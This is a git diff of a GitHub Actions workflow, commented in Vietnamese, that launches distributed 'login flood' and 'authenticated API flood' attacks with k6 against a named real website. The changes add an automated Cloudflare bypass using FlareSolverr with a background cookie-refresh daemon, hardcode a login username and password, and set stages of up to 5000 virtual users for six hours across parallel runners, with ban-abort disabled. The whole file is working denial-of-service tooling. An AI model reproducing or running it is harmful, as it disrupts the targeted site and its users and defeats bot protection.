@@ -9,7 +9,7 @@ on:
         default: 'login_flood'
         type: choice
         options:
-          - login_flood      # Login flood qua Cloudflare (cf_clearance bypass)
+          - login_flood      # Login flood qua Cloudflare (auto bypass)
           - auth_api_flood   # Login 1 lan, roi flood authenticated API (nang hon)
       runners:
         description: 'So runner song song (moi runner = 1 IP Azure khac nhau)'
@@ -23,22 +23,6 @@ on:
         description: 'Stages override (de trong = dung mac dinh)'
         required: false
         default: ''
-      cf_clearance:
-        description: 'cf_clearance cookie (lay tu FlareSolverr - expire ~30 phut)'
-        required: true
-        default: ''
-      cf_ua:
-        description: 'User-Agent phai khop voi luc lay cf_clearance'
-        required: false
-        default: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36'
-      php_identifier:
-        description: 'Login username/email'
-        required: false
-        default: 'lonussystem'
-      php_password:
-        description: 'Login password'
-        required: false
-        default: 'lonussystem123@'
 
 jobs:
   prepare:
@@ -73,45 +57,141 @@ jobs:
       - name: Tang ulimit
         run: ulimit -n 131072 || true
 
+      - name: Setup FlareSolverr (auto Cloudflare bypass)
+        run: |
+          echo "Installing FlareSolverr..."
+          docker run -d \
+            --name flaresolverr \
+            -p 8191:8191 \
+            -e LOG_LEVEL=info \
+            ghcr.io/flaresolverr/flaresolverr:latest
+          
+          echo "Waiting for FlareSolverr to start..."
+          for i in {1..30}; do
+            if curl -sf http://localhost:8191/health > /dev/null; then
+              echo "FlareSolverr ready!"
+              break
+            fi
+            echo "Waiting... ($i/30)"
+            sleep 2
+          done
+
+      - name: Get initial cf_clearance
+        id: get_cookie
+        run: |
+          echo "Getting cf_clearance from FlareSolverr..."
+          
+          RESPONSE=$(curl -s -X POST http://localhost:8191/v1 \
+            -H "Content-Type: application/json" \
+            -d '{
+              "cmd": "request.get",
+              "url": "https://thanhhuyreal.com",
+              "maxTimeout": 60000
+            }')
+          
+          CF_CLEARANCE=$(echo "$RESPONSE" | jq -r '.solution.cookies[] | select(.name=="cf_clearance") | .value')
+          CF_UA=$(echo "$RESPONSE" | jq -r '.solution.userAgent')
+          
+          if [ -z "$CF_CLEARANCE" ] || [ "$CF_CLEARANCE" = "null" ]; then
+            echo "ERROR: Failed to get cf_clearance"
+            echo "Response:"
+            echo "$RESPONSE" | jq '.'
+            exit 1
+          fi
+          
+          echo "cf_clearance=${CF_CLEARANCE}" >> $GITHUB_OUTPUT
+          echo "cf_ua=${CF_UA}" >> $GITHUB_OUTPUT
+          echo "Got cf_clearance: ${CF_CLEARANCE:0:50}... (${#CF_CLEARANCE} chars)"
+          echo "User-Agent: ${CF_UA:0:80}..."
+
+      - name: Start cookie auto-refresh daemon
+        run: |
+          cat > /tmp/refresh_cookie.sh << 'EOFSCRIPT'
+          #!/bin/bash
+          
+          COOKIE_FILE="/tmp/cf_clearance.txt"
+          UA_FILE="/tmp/cf_ua.txt"
+          LOG_FILE="/tmp/cookie-refresh.log"
+          
+          echo "[$(date)] Cookie refresh daemon started" | tee -a "$LOG_FILE"
+          
+          while true; do
+            sleep 1500  # 25 phút = 1500 giây
+            
+            echo "[$(date)] Refreshing cf_clearance..." | tee -a "$LOG_FILE"
+            
+            RESPONSE=$(curl -s -X POST http://localhost:8191/v1 \
+              -H "Content-Type: application/json" \
+              -d '{
+                "cmd": "request.get",
+                "url": "https://thanhhuyreal.com",
+                "maxTimeout": 60000
+              }')
+            
+            NEW_COOKIE=$(echo "$RESPONSE" | jq -r '.solution.cookies[] | select(.name=="cf_clearance") | .value')
+            NEW_UA=$(echo "$RESPONSE" | jq -r '.solution.userAgent')
+            
+            if [ -n "$NEW_COOKIE" ] && [ "$NEW_COOKIE" != "null" ]; then
+              echo "$NEW_COOKIE" > "$COOKIE_FILE"
+              echo "$NEW_UA" > "$UA_FILE"
+              echo "[$(date)] ✓ Updated cf_clearance: ${NEW_COOKIE:0:50}..." | tee -a "$LOG_FILE"
+            else
+              echo "[$(date)] ✗ Failed to refresh cookie" | tee -a "$LOG_FILE"
+              echo "$RESPONSE" | jq '.' | tee -a "$LOG_FILE"
+            fi
+          done
+          EOFSCRIPT
+          
+          chmod +x /tmp/refresh_cookie.sh
+          
+          # Save initial cookie & UA
+          echo "${{ steps.get_cookie.outputs.cf_clearance }}" > /tmp/cf_clearance.txt
+          echo "${{ steps.get_cookie.outputs.cf_ua }}" > /tmp/cf_ua.txt
+          
+          # Start background refresh
+          nohup /tmp/refresh_cookie.sh &
+          echo $! > /tmp/cookie-refresh.pid
+          
+          echo "Cookie refresh daemon started (PID: $(cat /tmp/cookie-refresh.pid))"
+          echo "Cookie will be refreshed every 25 minutes"
+
       - name: Runner info
         run: |
-          echo "Mode    : ${{ github.event.inputs.mode }}"
-          echo "Runner  : ${{ matrix.runner }}"
-          echo "IP      : $(curl -sf https://api.ipify.org || echo unknown)"
-          echo "CPU     : $(nproc) cores"
-          echo "RAM     : $(free -m | awk '/Mem:/{print $4}') MB free"
+          echo "Mode        : ${{ github.event.inputs.mode }}"
+          echo "Runner      : ${{ matrix.runner }}"
+          echo "Public IP   : $(curl -sf https://api.ipify.org || echo unknown)"
+          echo "CPU cores   : $(nproc)"
+          echo "RAM free    : $(free -m | awk '/Mem:/{print $4}') MB"
+          echo "cf_clearance: $(cat /tmp/cf_clearance.txt | cut -c1-50)..."
+          echo "User-Agent  : $(cat /tmp/cf_ua.txt | cut -c1-80)..."
 
       # ─────────────────────────────────────────────────────────────
-      # MODE: login_flood — Login flood qua Cloudflare với cf_clearance
+      # MODE: login_flood — Login flood qua Cloudflare
       # ─────────────────────────────────────────────────────────────
       - name: "[login_flood] Cloudflare bypass + Login flood"
         if: ${{ github.event.inputs.mode == 'login_flood' }}
         env:
-          PHP_BASE_URL:     "https://thanhhuyreal.com"
-          PHP_LOGIN_PAGE:   "/?auth=login"
-          PHP_LOGIN_PATH:   "/model/login"
-          PHP_IDENTIFIER:   ${{ github.event.inputs.php_identifier }}
-          PHP_PASSWORD:     ${{ github.event.inputs.php_password }}
-          CF_CLEARANCE:     ${{ github.event.inputs.cf_clearance }}
-          CF_UA:            ${{ github.event.inputs.cf_ua }}
+          PHP_BASE_URL:      "https://thanhhuyreal.com"
+          PHP_LOGIN_PAGE:    "/?auth=login"
+          PHP_LOGIN_PATH:    "/model/login"
+          PHP_IDENTIFIER:    "lonussystem"
+          PHP_PASSWORD:      "lonussystem123@"
+          CF_CLEARANCE_FILE: "/tmp/cf_clearance.txt"
+          CF_UA_FILE:        "/tmp/cf_ua.txt"
           PHP_FRESH_SESSION: "true"
-          STAGES:           ${{ github.event.inputs.stages || '30s:50,60s:200,60s:500,360m:500' }}
-          START_RATE:       "20"
-          PRE_VUS:          "100"
-          MAX_VUS:          ${{ github.event.inputs.max_vus || '2000' }}
-          REQUEST_TIMEOUT:  "20s"
-          REQUEST_DELAY:    "0"
-          MAX_5XX_RATE:     "0.9"
-          MAX_TIMEOUT_RATE: "0.9"
-          ABORT_ON_BAN:     "false"
+          STAGES:            ${{ github.event.inputs.stages || '30s:50,60s:200,60s:500,360m:500' }}
+          START_RATE:        "20"
+          PRE_VUS:           "100"
+          MAX_VUS:           ${{ github.event.inputs.max_vus || '2000' }}
+          REQUEST_TIMEOUT:   "20s"
+          REQUEST_DELAY:     "0"
+          MAX_5XX_RATE:      "0.9"
+          MAX_TIMEOUT_RATE:  "0.9"
+          ABORT_ON_BAN:      "false"
         run: |
           ulimit -n 131072 || true
-          if [ -z "$CF_CLEARANCE" ]; then
-            echo "ERROR: cf_clearance is required! Get it from FlareSolverr."
-            exit 1
-          fi
-          echo "CF_CLEARANCE: ${CF_CLEARANCE:0:20}... (${#CF_CLEARANCE} chars)"
-          echo "Starting login flood attack..."
+          echo "Starting login flood attack with auto cookie refresh..."
+          echo "Cookie will be auto-refreshed every 25 minutes"
           k6 run --no-usage-report sites/thanhhuyreal/test-script-login.js
 
       # ─────────────────────────────────────────────────────────────
@@ -120,33 +200,47 @@ jobs:
       - name: "[auth_api_flood] Login once, then flood API endpoints"
         if: ${{ github.event.inputs.mode == 'auth_api_flood' }}
         env:
-          IP_URL:           "https://thanhhuyreal.com"
-          SITE_HOST:        "thanhhuyreal.com"
-          PHP_IDENTIFIER:   ${{ github.event.inputs.php_identifier }}
-          PHP_PASSWORD:     ${{ github.event.inputs.php_password }}
-          CF_CLEARANCE:     ${{ github.event.inputs.cf_clearance }}
-          CF_UA:            ${{ github.event.inputs.cf_ua }}
-          STAGES:           ${{ github.event.inputs.stages || '30s:200,60s:1000,60s:3000,360m:3000' }}
-          START_RATE:       "50"
-          PRE_VUS:          "300"
-          MAX_VUS:          ${{ github.event.inputs.max_vus || '5000' }}
-          REQUEST_TIMEOUT:  "30s"
-          MAX_ERR_RATE:     "0.9"
+          IP_URL:            "https://thanhhuyreal.com"
+          SITE_HOST:         "thanhhuyreal.com"
+          PHP_IDENTIFIER:    "lonussystem"
+          PHP_PASSWORD:      "lonussystem123@"
+          CF_CLEARANCE_FILE: "/tmp/cf_clearance.txt"
+          CF_UA_FILE:        "/tmp/cf_ua.txt"
+          STAGES:            ${{ github.event.inputs.stages || '30s:200,60s:1000,60s:3000,360m:3000' }}
+          START_RATE:        "50"
+          PRE_VUS:           "300"
+          MAX_VUS:           ${{ github.event.inputs.max_vus || '5000' }}
+          REQUEST_TIMEOUT:   "30s"
+          MAX_ERR_RATE:      "0.9"
         run: |
           ulimit -n 131072 || true
-          if [ -z "$CF_CLEARANCE" ]; then
-            echo "ERROR: cf_clearance is required! Get it from FlareSolverr."
-            exit 1
-          fi
-          echo "CF_CLEARANCE: ${CF_CLEARANCE:0:20}... (${#CF_CLEARANCE} chars)"
-          echo "Starting authenticated API flood..."
+          echo "Starting authenticated API flood with auto cookie refresh..."
+          echo "Cookie will be auto-refreshed every 25 minutes"
           k6 run --no-usage-report sites/thanhhuyreal/test-script-auth.js
 
-      - name: Upload results (if failed)
+      - name: Cleanup
+        if: always()
+        run: |
+          if [ -f /tmp/cookie-refresh.pid ]; then
+            echo "Stopping cookie refresh daemon..."
+            kill $(cat /tmp/cookie-refresh.pid) 2>/dev/null || true
+          fi
+          
+          echo "Stopping FlareSolverr..."
+          docker stop flaresolverr 2>/dev/null || true
+          docker rm flaresolverr 2>/dev/null || true
+          
+          if [ -f /tmp/cookie-refresh.log ]; then
+            echo "=== Cookie Refresh Log ==="
+            tail -n 50 /tmp/cookie-refresh.log
+          fi
+
+      - name: Upload logs (if failed)
         if: failure()
         uses: actions/upload-artifact@v4
         with:
           name: k6-results-runner-${{ matrix.runner }}
           path: |
             /tmp/k6-*.log
+            /tmp/cookie-refresh.log
           retention-days: 7
